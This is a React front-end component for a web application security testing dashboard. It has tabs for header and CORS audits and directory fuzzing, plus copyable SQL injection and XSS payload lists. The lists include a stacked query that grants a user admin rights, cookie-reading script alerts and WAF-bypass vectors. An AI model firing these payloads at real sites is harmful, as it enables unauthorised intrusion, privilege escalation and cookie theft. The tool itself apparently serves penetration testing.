import React, { useState } from 'react';
import { Globe, ShieldAlert, Code2, FolderSearch, RefreshCw, Copy, Check, ExternalLink, CheckCircle2, XCircle } from 'lucide-react';

export default function WebTestingView({ activeTarget, addLog }) {
  const [subTab, setSubTab] = useState('headers'); // headers | cors | sqli | xss | fuzz

  // Headers Audit State
  const [headerTarget, setHeaderTarget] = useState(activeTarget || 'https://example.com');
  const [headerResult, setHeaderResult] = useState(null);
  const [loadingHeader, setLoadingHeader] = useState(false);

  // CORS Inspector State
  const [corsTarget, setCorsTarget] = useState(activeTarget || 'https://example.com');
  const [corsResult, setCorsResult] = useState(null);
  const [loadingCors, setLoadingCors] = useState(false);

  // SQLi Payload Generator State
  const [sqliType, setSqliType] = useState('UNION');
  const [sqliEncoder, setSqliEncoder] = useState('raw');
  const [copiedPayload, setCopiedPayload] = useState(null);

  // XSS Payload Generator State
  const [xssCategory, setXssCategory] = useState('REFLECTED');

  // Directory Fuzzer State
  const [fuzzTarget, setFuzzTarget] = useState(activeTarget || 'https://example.com');
  const [fuzzResult, setFuzzResult] = useState(null);
  const [loadingFuzz, setLoadingFuzz] = useState(false);

  // 1. Audit Security Headers
  const handleAuditHeaders = async () => {
    if (!headerTarget) return;
    setLoadingHeader(true);
    try {
      const res = await fetch('/api/web/headers', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ url: headerTarget })
      });
      const data = await res.json();
      setHeaderResult(data);
      addLog('SUCCESS', `HTTP Security Headers Audit (${data.score_passed})`, data);
    } catch (e) {
      addLog('ERROR', 'Headers Audit Failed', { error: e.message });
    } finally {
      setLoadingHeader(false);
    }
  };

  // 2. Audit CORS Policy
  const handleAuditCors = async () => {
    if (!corsTarget) return;
    setLoadingCors(true);
    try {
      const res = await fetch('/api/web/cors', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ url: corsTarget })
      });
      const data = await res.json();
      setCorsResult(data);
      addLog(data.vulnerable ? 'ERROR' : 'SUCCESS', `CORS Misconfig Audit`, data);
    } catch (e) {
      addLog('ERROR', 'CORS Test Failed', { error: e.message });
    } finally {
      setLoadingCors(false);
    }
  };

  // 3. Fuzz Directories
  const handleFuzzDirectories = async () => {
    if (!fuzzTarget) return;
    setLoadingFuzz(true);
    try {
      const res = await fetch('/api/web/fuzz_dir', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ url: fuzzTarget })
      });
      const data = await res.json();
      setFuzzResult(data);
      addLog('SUCCESS', `Directory Fuzz Scanner (${data.scanned_count} paths)`, data);
    } catch (e) {
      addLog('ERROR', 'Directory Fuzzing Failed', { error: e.message });
    } finally {
      setLoadingFuzz(false);
    }
  };

  const sqliPayloads = [
    { type: 'UNION', name: 'UNION Select Version', raw: "' UNION SELECT NULL, @@version, NULL--" },
    { type: 'UNION', name: 'UNION Table Enumeration', raw: "' UNION SELECT 1, table_name FROM information_schema.tables--" },
    { type: 'ERROR', name: 'MySQL ExtractValue Error', raw: "' AND ExtractValue(1, concat(0x5c, (SELECT version())))--" },
    { type: 'BLIND', name: 'Boolean True Payload', raw: "' AND 1=1--" },
    { type: 'TIME', name: 'MySQL Sleep Time Delay', raw: "'; SELECT SLEEP(5)--" },
    { type: 'STACKED', name: 'Stacked Query DROP/UPDATE', raw: "'; UPDATE users SET role='admin' WHERE user='target'--" }
  ];

  const xssPayloads = [
    { cat: 'REFLECTED', name: 'Basic Script Alert', raw: "<script>alert(document.cookie)</script>" },
    { cat: 'REFLECTED', name: 'Img Error Vector', raw: "<img src=x onerror=alert('XSS')>" },
    { cat: 'POLYGLOT', name: 'XSS Filter Bypass Polyglot', raw: "jaVasCript:/*-/*`/*\\`/*'/*\"/*%0D%0Aalert(1)//" },
    { cat: 'DOM', name: 'SVG Onload Event', raw: "<svg onload=alert(1)>" },
    { cat: 'WAF_BYPASS', name: 'String.fromCharCode Bypass', raw: "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>" }
  ];

  const encodePayload = (rawStr, encType) => {
    if (encType === 'url') return encodeURIComponent(rawStr);
    if (encType === 'hex') return '0x' + Array.from(rawStr).map(c => c.charCodeAt(0).toString(16)).join('');
    if (encType === 'comment') return rawStr.replace(/ /g, '/**/');
    return rawStr;
  };

  const copyText = (text, key) => {
    navigator.clipboard.writeText(text);
    setCopiedPayload(key);
    setTimeout(() => setCopiedPayload(null), 2000);
  };

  return (
    <div className="space-y-4 pb-20">
      <div className="flex items-center space-x-2">
        <Globe className="w-5 h-5 text-cyan-400" />
        <h1 className="font-extrabold text-base text-slate-100">Web App Security Testing</h1>
      </div>

      {/* Sub Tab Bar */}
      <div className="flex space-x-1 bg-slate-900 p-1 rounded-xl border border-slate-800 text-xs font-mono overflow-x-auto">
        {[
          { id: 'headers', label: 'HTTP Headers' },
          { id: 'cors', label: 'CORS Inspector' },
          { id: 'sqli', label: 'SQLi Builder' },
          { id: 'xss', label: 'XSS Vectors' },
          { id: 'fuzz', label: 'Directory Fuzzer' }
        ].map((tab) => (
          <button
            key={tab.id}
            onClick={() => setSubTab(tab.id)}
            className={`px-3 py-1.5 rounded-lg transition-all shrink-0 ${
              subTab === tab.id
                ? 'bg-cyan-500/20 text-cyan-400 font-bold border border-cyan-500/30'
                : 'text-slate-400 hover:text-slate-200'
            }`}
          >
            {tab.label}
          </button>
        ))}
      </div>

      {/* SUBTAB 1: HTTP HEADERS */}
      {subTab === 'headers' && (
        <div className="space-y-3">
          <div className="bg-slate-900 rounded-xl p-3.5 border border-slate-800 space-y-3">
            <div>
              <label className="text-xs font-mono text-slate-400 block mb-1">Target Website URL:</label>
              <input
                type="text"
                value={headerTarget}
                onChange={(e) => setHeaderTarget(e.target.value)}
                placeholder="https://example.com"
                className="w-full bg-slate-950 border border-slate-800 focus:border-cyan-500 text-slate-100 rounded-lg p-2.5 font-mono text-xs focus:outline-none"
              />
            </div>

            <button
              onClick={handleAuditHeaders}
              disabled={loadingHeader}
              className="w-full py-2 bg-cyan-500 hover:bg-cyan-600 text-slate-950 font-bold font-mono rounded-lg text-xs flex items-center justify-center space-x-1"
            >
              {loadingHeader ? <RefreshCw className="w-4 h-4 animate-spin" /> : <Globe className="w-4 h-4" />}
              <span>Inspect Security Headers</span>
            </button>
          </div>

          {headerResult && (
            <div className="bg-slate-900 rounded-xl p-3.5 border border-slate-800 font-mono text-xs space-y-3">
              <div className="flex items-center justify-between border-b border-slate-800 pb-2">
                <div>
                  <span className="text-slate-400 text-[10px] block">Target Audit</span>
                  <span className="text-cyan-400 font-bold text-xs truncate block max-w-xs">{headerResult.url}</span>
                </div>
                <div className="text-right">
                  <span className="text-slate-400 text-[10px] block">Security Score</span>
                  <span className="font-extrabold text-sm text-emerald-400">{headerResult.score_passed} Passed</span>
                </div>
              </div>

              {/* Audit Header Items */}
              <div className="space-y-2">
                {headerResult.audit.map((item, idx) => (
                  <div key={idx} className="bg-slate-950 p-2.5 rounded border border-slate-800 space-y-1">
                    <div className="flex items-center justify-between">
                      <div className="flex items-center space-x-1.5">
                        {item.present ? (
                          <CheckCircle2 className="w-4 h-4 text-emerald-400" />
                        ) : (
                          <XCircle className="w-4 h-4 text-red-400" />
                        )}
                        <span className="font-bold text-slate-200">{item.header}</span>
                      </div>
                      <span className={`text-[10px] px-1.5 py-0.5 rounded font-bold ${item.present ? 'bg-emerald-500/20 text-emerald-400' : 'bg-red-500/20 text-red-400'}`}>
                        {item.present ? 'CONFIGURED' : 'MISSING'}
                      </span>
                    </div>
                    <p className="text-[10px] text-slate-400">{item.description}</p>
                    {item.present && (
                      <div className="text-[11px] text-emerald-300/90 bg-slate-900 p-1.5 rounded truncate border border-slate-800">
                        {item.value}
                      </div>
                    )}
                  </div>
                ))}
              </div>
            </div>
          )}
        </div>
      )}

      {/* SUBTAB 2: CORS INSPECTOR */}
      {subTab === 'cors' && (
        <div className="space-y-3">
          <div className="bg-slate-900 rounded-xl p-3.5 border border-slate-800 space-y-3">
            <div>
              <label className="text-xs font-mono text-slate-400 block mb-1">Target Origin Test URL:</label>
              <input
                type="text"
                value={corsTarget}
                onChange={(e) => setCorsTarget(e.target.value)}
                placeholder="https://api.example.com"
                className="w-full bg-slate-950 border border-slate-800 focus:border-cyan-500 text-slate-100 rounded-lg p-2.5 font-mono text-xs focus:outline-none"
              />
            </div>

            <button
              onClick={handleAuditCors}
              disabled={loadingCors}
              className="w-full py-2 bg-gradient-to-r from-cyan-500 to-blue-500 text-slate-950 font-bold font-mono rounded-lg text-xs flex items-center justify-center space-x-1"
            >
              {loadingCors ? <RefreshCw className="w-4 h-4 animate-spin" /> : <ShieldAlert className="w-4 h-4" />}
              <span>Test CORS Policy Vulnerability</span>
            </button>
          </div>

          {corsResult && (
            <div className={`rounded-xl p-3.5 border font-mono text-xs space-y-2 ${
              corsResult.vulnerable ? 'bg-red-950/20 border-red-800 text-red-300' : 'bg-emerald-950/20 border-emerald-800 text-emerald-300'
            }`}>
              <div className="flex items-center justify-between border-b border-slate-800 pb-1.5">
                <span className="font-bold">CORS Audit Verdict</span>
                <span className={`px-2 py-0.5 rounded text-[10px] font-bold ${corsResult.vulnerable ? 'bg-red-500 text-slate-950' : 'bg-emerald-500 text-slate-950'}`}>
                  {corsResult.vulnerable ? 'VULNERABLE' : 'SECURE / RESTRICTIVE'}
                </span>
              </div>

              <div className="space-y-1 text-[11px] pt-1">
                <div>Access-Control-Allow-Origin: <code className="text-cyan-400 font-bold">{corsResult.allow_origin}</code></div>
                <div>Access-Control-Allow-Credentials: <code className="text-amber-400 font-bold">{corsResult.allow_credentials}</code></div>
              </div>

              <div className="pt-2 border-t border-slate-800 space-y-1">
                <div className="font-bold text-slate-200">Findings:</div>
                {corsResult.findings.map((f, i) => (
                  <div key={i} className="text-[11px]">{f}</div>
                ))}
              </div>
            </div>
          )}
        </div>
      )}

      {/* SUBTAB 3: SQLi PAYLOAD BUILDER */}
      {subTab === 'sqli' && (
        <div className="space-y-3">
          <div className="bg-slate-900 rounded-xl p-3.5 border border-slate-800 space-y-3">
            <div className="grid grid-cols-2 gap-2">
              <div>
                <label className="text-[10px] font-mono text-slate-400 block mb-1">SQLi Type:</label>
                <select
                  value={sqliType}
                  onChange={(e) => setSqliType(e.target.value)}
                  className="w-full bg-slate-950 border border-slate-800 text-slate-100 rounded p-2 font-mono text-xs focus:outline-none"
                >
                  <option value="UNION">UNION Based</option>
                  <option value="ERROR">Error Based</option>
                  <option value="BLIND">Boolean Blind</option>
                  <option value="TIME">Time Delay</option>
                  <option value="STACKED">Stacked Query</option>
                </select>
              </div>

              <div>
                <label className="text-[10px] font-mono text-slate-400 block mb-1">Encoding Bypass:</label>
                <select
                  value={sqliEncoder}
                  onChange={(e) => setSqliEncoder(e.target.value)}
                  className="w-full bg-slate-950 border border-slate-800 text-slate-100 rounded p-2 font-mono text-xs focus:outline-none"
                >
                  <option value="raw">Raw Plaintext</option>
                  <option value="url">URL Encoded (%27...)</option>
                  <option value="hex">Hexadecimal (0x...)</option>
                  <option value="comment">Inline Comments (/**/)</option>
                </select>
              </div>
            </div>
          </div>

          <div className="space-y-2">
            {sqliPayloads.filter(p => p.type === sqliType).map((payload, idx) => {
              const formatted = encodePayload(payload.raw, sqliEncoder);
              const key = `sqli_${idx}`;
              return (
                <div key={idx} className="bg-slate-900 p-3 rounded-xl border border-slate-800 space-y-1.5 font-mono text-xs">
                  <div className="flex justify-between items-center text-slate-300 font-bold">
                    <span className="text-cyan-400">{payload.name}</span>
                    <button
                      onClick={() => copyText(formatted, key)}
                      className="p-1 hover:bg-slate-800 text-slate-400 hover:text-slate-200 rounded flex items-center space-x-1 text-[10px]"
                    >
                      {copiedPayload === key ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                      <span>{copiedPayload === key ? 'Copied' : 'Copy'}</span>
                    </button>
                  </div>
                  <div className="bg-slate-950 p-2 rounded border border-slate-800 text-emerald-400 truncate select-all">
                    {formatted}
                  </div>
                </div>
              );
            })}
          </div>
        </div>
      )}

      {/* SUBTAB 4: XSS VECTORS */}
      {subTab === 'xss' && (
        <div className="space-y-3">
          <div className="bg-slate-900 rounded-xl p-3.5 border border-slate-800 space-y-2">
            <label className="text-xs font-mono text-slate-400 block">XSS Vector Category:</label>
            <div className="flex space-x-1 font-mono text-[11px] overflow-x-auto">
              {['REFLECTED', 'POLYGLOT', 'DOM', 'WAF_BYPASS'].map((cat) => (
                <button
                  key={cat}
                  onClick={() => setXssCategory(cat)}
                  className={`px-2.5 py-1 rounded transition-all shrink-0 ${
                    xssCategory === cat ? 'bg-cyan-500/20 text-cyan-400 font-bold border border-cyan-500/30' : 'bg-slate-950 text-slate-400'
                  }`}
                >
                  {cat}
                </button>
              ))}
            </div>
          </div>

          <div className="space-y-2">
            {xssPayloads.filter(p => p.cat === xssCategory).map((payload, idx) => {
              const key = `xss_${idx}`;
              return (
                <div key={idx} className="bg-slate-900 p-3 rounded-xl border border-slate-800 space-y-1.5 font-mono text-xs">
                  <div className="flex justify-between items-center text-slate-300 font-bold">
                    <span className="text-cyan-400">{payload.name}</span>
                    <button
                      onClick={() => copyText(payload.raw, key)}
                      className="p-1 hover:bg-slate-800 text-slate-400 hover:text-slate-200 rounded flex items-center space-x-1 text-[10px]"
                    >
                      {copiedPayload === key ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                      <span>{copiedPayload === key ? 'Copied' : 'Copy'}</span>
                    </button>
                  </div>
                  <div className="bg-slate-950 p-2 rounded border border-slate-800 text-emerald-400 select-all whitespace-pre-wrap break-all">
                    {payload.raw}
                  </div>
                </div>
              );
            })}
          </div>
        </div>
      )}

      {/* SUBTAB 5: DIRECTORY FUZZER */}
      {subTab === 'fuzz' && (
        <div className="space-y-3">
          <div className="bg-slate-900 rounded-xl p-3.5 border border-slate-800 space-y-3">
            <div>
              <label className="text-xs font-mono text-slate-400 block mb-1">Target Base URL:</label>
              <input
                type="text"
                value={fuzzTarget}
                onChange={(e) => setFuzzTarget(e.target.value)}
                placeholder="https://example.com"
                className="w-full bg-slate-950 border border-slate-800 focus:border-cyan-500 text-slate-100 rounded-lg p-2.5 font-mono text-xs focus:outline-none"
              />
            </div>

            <button
              onClick={handleFuzzDirectories}
              disabled={loadingFuzz}
              className="w-full py-2 bg-gradient-to-r from-cyan-500 to-blue-500 text-slate-950 font-bold font-mono rounded-lg text-xs flex items-center justify-center space-x-1"
            >
              {loadingFuzz ? <RefreshCw className="w-4 h-4 animate-spin" /> : <FolderSearch className="w-4 h-4" />}
              <span>Fuzz Common Directories & Leaks</span>
            </button>
          </div>

          {fuzzResult && (
            <div className="bg-slate-900 rounded-xl p-3.5 border border-slate-800 space-y-2 font-mono text-xs">
              <div className="text-slate-400 text-xs border-b border-slate-800 pb-1.5 flex justify-between">
                <span>Paths Scanned: {fuzzResult.scanned_count}</span>
                <span className="text-cyan-400 font-bold">{fuzzResult.target}</span>
              </div>

              <div className="space-y-1.5">
                {fuzzResult.results.map((res, i) => (
                  <div key={i} className="bg-slate-950 p-2 rounded border border-slate-800 flex items-center justify-between text-[11px]">
                    <div className="truncate mr-2">
                      <span className="text-slate-200 font-bold mr-2">{res.path}</span>
                      <span className="text-slate-500 text-[10px]">{res.content_type}</span>
                    </div>

                    <span className={`px-2 py-0.5 rounded font-bold shrink-0 text-[10px] ${
                      res.status === 200 ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/30' :
                      res.status === 403 ? 'bg-amber-500/20 text-amber-400 border border-amber-500/30' :
                      'bg-slate-800 text-slate-500'
                    }`}>
                      {res.status}
                    </span>
                  </div>
                ))}
              </div>
            </div>
          )}
        </div>
      )}
    </div>
  );
}
